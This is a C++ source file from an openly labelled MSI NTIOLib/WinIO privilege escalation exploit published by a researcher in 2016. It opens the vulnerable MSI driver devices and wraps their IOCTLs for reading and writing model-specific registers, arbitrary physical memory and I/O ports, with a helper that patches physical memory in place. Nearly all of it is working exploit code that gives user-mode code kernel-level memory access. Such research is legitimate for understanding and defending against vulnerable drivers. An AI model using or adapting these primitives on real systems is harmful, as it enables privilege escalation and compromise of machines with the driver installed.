/**
*
* MSI NTIOLib/WinIO privilege escalation exploit
*
* Copyright (c) 2016 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1630
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#include "NTIOLib.h"

NTIOLib::NTIOLib()
{
	static const char* const driverNames[] =
	{
		"\\\\.\\NTIOLib_FastBoot",
		"\\\\.\\NTIOLib_MSIDDR_CC",
		"\\\\.\\NTIOLib_MSISMB_CC",
		"\\\\.\\NTIOLib_MSISuperIO_CC",
		"\\\\.\\NTIOLib_MSIClock_CC",
		"\\\\.\\NTIOLib_MSICOMM_CC",
		"\\\\.\\NTIOLib_MSIFrequency_CC",
		"\\\\.\\NTIOLib_1_0_2",
		"\\\\.\\NTIOLib_1_0_3",
		"\\\\.\\NTIOLib_1_0_4",
		"\\\\.\\NTIOLib_1_0_6",
		"\\\\.\\NTIOLib_MSICPU_CC",
		"\\\\.\\NTIOLib_MB",
		"\\\\.\\NTIOLib_ACTIVE_X"
	};
	for (int i = 0; i < _countof(driverNames); i++)
	{
		hDevice = CreateFileA(driverNames[i], 0xC0000000, 0, 0, 3u, 0x80u, 0);
		if (INVALID_HANDLE_VALUE != hDevice)
			break;
	}
}

NTIOLib::~NTIOLib()
{
	if (INVALID_HANDLE_VALUE != hDevice)
		CloseHandle(hDevice);
}

uint64_t NTIOLib::readPmc(uint32_t pmc) const
{
	uint64_t ret = 0;
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		DeviceIoControl(hDevice, 0xC350208C, &pmc, sizeof(pmc), &ret, sizeof(ret), &retSize, 0);
	}
	return ret;
}

uint64_t NTIOLib::readMsr(uint32_t msr) const
{
	uint64_t ret = 0;
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		DeviceIoControl(hDevice, 0xC3502084, &msr, sizeof(msr), &ret, sizeof(ret), &retSize, 0);
	}
	return ret;
}

bool NTIOLib::writeMsr(uint32_t msr, uint64_t value) const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		if (DeviceIoControl(hDevice, 0xC3502088, &msr, sizeof(msr), &value, sizeof(value), &retSize, 0))
			return true;
	}
	return false;
}

bool NTIOLib::readPhysicalMemory(uint64_t physAddress, uint8_t* buffer, size_t size) const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		rwMemStruct st = { physAddress, 1, size };
		if (DeviceIoControl(hDevice, 0xC3506104, &st, sizeof(st), buffer, size, &retSize, 0))
			return true;
	}
	return false;
}

bool NTIOLib::writePhysicalMemory(uint64_t physAddress, const uint8_t* buffer, size_t size) const
{
	bool ret = false;
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		rwMemStruct st = { physAddress, 1, size };
		uint8_t* mem = (uint8_t*)malloc(sizeof(rwMemStruct) + size);
		if (nullptr == mem)
			return false;
		memcpy(mem, &st, sizeof(st));
		memcpy(mem + sizeof(st), buffer, size);
		ret = DeviceIoControl(hDevice, 0xC350A108, mem, sizeof(rwMemStruct) + size, 0, 0, &retSize, 0) == TRUE;
		free(mem);
	}
	return ret;
}

void NTIOLib::halt() const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		DeviceIoControl(hDevice, 0xC3502090, 0, 0, 0, 0, &retSize, 0);
	}
}

bool NTIOLib::in8(uint16_t port, uint8_t& outv) const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		uint32_t tmp = port;
		if (DeviceIoControl(hDevice, 0xC35060CC, &tmp, sizeof(tmp), &outv, sizeof(uint8_t), &retSize, 0))
			return true;
	}
	return false;
}

bool NTIOLib::out8(uint16_t port, uint8_t inv) const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		uint8_t buf[5] = { 0 };
		memcpy(buf, &port, sizeof(port));
		buf[4] = inv;
		if (DeviceIoControl(hDevice, 0xC350A0D8, buf, sizeof(buf), 0, 0, &retSize, 0))
			return true;
	}
	return false;
}

MemoryNTIOLib::MemoryNTIOLib() : m_IMemoryHelper(nullptr), m_IMemoryHelperSize(0), m_IMemoryHelperAddr(0) {}

uint8_t* MemoryNTIOLib::getMemory(uint64_t physAddr, size_t size)
{
	reset();
	uint8_t* ret = (uint8_t*)malloc(size);
	if (nullptr == ret)
		return ret;
	if (m_ntio.readPhysicalMemory(physAddr, ret, size))
	{
		m_IMemoryHelper = ret;
		m_IMemoryHelperSize = size;
		m_IMemoryHelperAddr = physAddr;
		return ret;
	}
	free(ret);
	return nullptr;
}

void MemoryNTIOLib::commitMemory()
{
	if (nullptr != m_IMemoryHelper)
	{
		m_ntio.writePhysicalMemory(m_IMemoryHelperAddr, m_IMemoryHelper, m_IMemoryHelperSize);
		free(m_IMemoryHelper);
		m_IMemoryHelper = 0;
		m_IMemoryHelperAddr = 0;
		m_IMemoryHelperSize = 0;
	}
}

void MemoryNTIOLib::reset()
{
	if (nullptr != m_IMemoryHelper)
	{
		free(m_IMemoryHelper);
		m_IMemoryHelper = 0;
		m_IMemoryHelperAddr = 0;
		m_IMemoryHelperSize = 0;
	}
}

uint64_t MemoryNTIOLib::getPhysicalAddress()
{
	return m_IMemoryHelperAddr;
}

namespace {
	template<class T>
	void Write(const NTIOLib& ntio, uint64_t address, const T& value) {
		ntio.writePhysicalMemory(address, reinterpret_cast<const uint8_t*>(&value), sizeof(T));
	}
}

void MemoryNTIOLib::commitValue(size_t offsetInBuf, uint64_t value)
{
	Write(m_ntio, m_IMemoryHelperAddr + offsetInBuf, value);
	reset();
}
